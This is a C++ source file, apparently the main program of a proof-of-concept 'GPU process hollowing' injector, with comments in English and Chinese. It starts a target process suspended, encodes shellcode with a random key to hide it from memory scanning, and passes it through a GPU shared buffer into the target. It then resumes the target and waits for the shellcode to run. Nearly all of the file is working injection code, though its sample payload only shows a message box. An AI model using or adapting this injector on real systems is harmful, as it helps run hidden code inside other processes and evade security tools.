#include "GPUPayloadTransport.h"
#include "ProcessManager.h"
#include "Shellcode.h"
#include "SharedStructures.h"
#include <iostream>
#include <filesystem>
#include <random>

HANDLE createEvent(const wchar_t* name) {
    // All GPU sync events share the same creation flags, keep construction centralized.
    return CreateEventW(nullptr, TRUE, FALSE, name);
}

int main() {
    std::cout << "[injector] gpu process hollowing poc\n";

    // Target.exe 默认与 Injector 放在同目录，方便 PoC 演示。
    std::filesystem::path targetPath = std::filesystem::current_path() / "Target.exe";
    if (!std::filesystem::exists(targetPath)) {
        std::cerr << "[injector] target.exe not found\n";
        return 1;
    }

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<uint32_t> dis(0, UINT32_MAX);
    // 生成一次性编码密钥，避免共享缓冲区中出现明文。
    uint32_t encodeKey = dis(gen);

    HANDLE payloadReadyEvent = createEvent(GPUInject::PAYLOAD_READY_EVENT);
    HANDLE decodeCompleteEvent = createEvent(GPUInject::DECODE_COMPLETE_EVENT);
    HANDLE executionCompleteEvent = createEvent(GPUInject::EXECUTION_COMPLETE_EVENT);

    if (!payloadReadyEvent || !decodeCompleteEvent || !executionCompleteEvent) {
        std::cerr << "[injector] failed to create sync events\n";
        return 1;
    }

    GPUPayloadTransport transport;
    if (!transport.initialize()) {
        std::cerr << "[injector] failed to initialize gpu transport\n";
        return 1;
    }

    std::cout << "[injector] encoding payload on cpu\n";
    uint8_t* payload = Shellcode::messageBoxPayload;
    uint32_t payloadSize = Shellcode::messageBoxPayloadSize;

    if (!transport.encodeAndUploadPayload(payload, payloadSize, encodeKey)) {
        std::cerr << "[injector] failed to upload payload\n";
        return 1;
    }

    std::cout << "[injector] spawning target process (pid: ";
    ProcessManager procMgr;
    if (!procMgr.createSuspendedTarget(targetPath.wstring())) {
        std::cerr << "[injector] failed to create target\n";
        return 1;
    }

    std::cout << procMgr.getTargetPID() << ")\n";

    if (!procMgr.writeSharedGPUData(transport.getSharedBufferHandle(), payloadSize, encodeKey)) {
        std::cerr << "[injector] failed to write shared data\n";
        return 1;
    }

    if (!procMgr.resumeTarget()) {
        std::cerr << "[injector] failed to resume target\n";
        return 1;
    }

    SetEvent(payloadReadyEvent);

    // 与 Target 线程握手：等待 GPU 解码完成，再等待 shellcode 执行结束。
    std::cout << "[injector] waiting for gpu decode\n";
    WaitForSingleObject(decodeCompleteEvent, INFINITE);

    std::cout << "[injector] waiting for execution\n";
    WaitForSingleObject(executionCompleteEvent, 10000);

    std::cout << "[injector] injection complete\n";

    CloseHandle(payloadReadyEvent);
    CloseHandle(decodeCompleteEvent);
    CloseHandle(executionCompleteEvent);

    return 0;
}
